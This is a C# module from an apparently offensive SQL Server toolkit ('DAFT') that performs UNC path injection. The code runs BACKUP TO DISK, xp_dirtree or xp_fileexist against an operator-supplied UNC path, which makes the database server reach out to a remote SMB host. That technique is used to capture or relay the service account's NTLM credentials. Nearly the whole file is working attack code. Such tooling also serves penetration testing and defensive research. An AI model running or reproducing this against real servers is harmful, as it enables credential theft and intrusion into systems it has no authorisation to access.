using System;
using System.Data;
using System.Linq;
using System.Text;

namespace DAFT.Modules
{
    sealed class SQLUncPathInjection : Module
    {
        private string uncpath = string.Empty;

        internal SQLUncPathInjection(Credentials credentials) : base(credentials)
        {
        }

        internal void SetUNCPath(string uncpath)
        {
            this.uncpath = uncpath;
        }

        internal override bool Query()
        {
            using (SQLConnection sql = new SQLConnection(instance))
            {
                sql.BuildConnectionString(credentials);
                if (sql.Connect())
                {
                    SQLServerInfo i = new SQLServerInfo(credentials);
                    i.SetInstance(instance);
                    i.Query();
                    SQLServerInfo.Details d = i.GetResults();

                    int versionShort;
                    if (!int.TryParse(d.SQLServerMajorVersion.Split('.').First(), out versionShort))
                    {
                        Console.WriteLine("[-] Unable to ascertain SQL Version");
                        Console.WriteLine("[*] It is possible to override this with the --version flag");
                        return false;
                    }

                    string query1 = string.Empty;
                    string query2 = string.Empty;
                    if (11 > versionShort)
                    {
                        query1 = string.Format("BACKUP LOG [TESTING] TO DISK = \'{0}\'", uncpath);
                        query2 = string.Format("BACKUP DATABASE [TESTING] TO DISK = \'{0}\'", uncpath);
                    }
                    else
                    {
                        query1 = string.Format("xp_dirtree \'{0}\'", uncpath);
                        query2 = string.Format("xp_fileexist \'{0}\'", uncpath);
                    }

                    _Query(sql, query1);
                    _Query(sql, query2);
                }
            }
            return true;
        }

        private static void _Query(SQLConnection sql, string query)
        {
#if DEBUG
            Console.WriteLine(query);
#endif
            DataTable table = sql.Query(query);
            StringBuilder output = new StringBuilder();
            try
            {
                foreach (DataRow row in table.AsEnumerable())
                {
                    foreach (var col in row.ItemArray)
                    {
                        output.AppendFormat("{0} ", col);
                    }
                }
                Console.WriteLine(output.ToString());
            }
            catch (Exception ex)
            {
                if (ex is ArgumentNullException)
                    Console.WriteLine("Empty Response");
                else
                    Console.WriteLine(ex.Message);
            }
        }
    }
}